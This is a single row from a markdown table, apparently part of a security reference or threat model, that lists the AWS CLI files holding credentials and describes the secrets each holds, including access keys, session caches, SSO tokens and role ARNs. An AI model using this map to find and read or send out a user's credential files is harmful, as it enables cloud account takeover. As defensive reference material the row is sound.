| AWS CLI | `~/.aws/credentials`, `~/.aws/config`, `~/.aws/cli/cache/*.json`, `~/.aws/sso/cache/*.json` | Long-lived access keys, assumed-role session caches, SSO access and refresh tokens. `config` also maps out account IDs and role ARNs the user can assume |
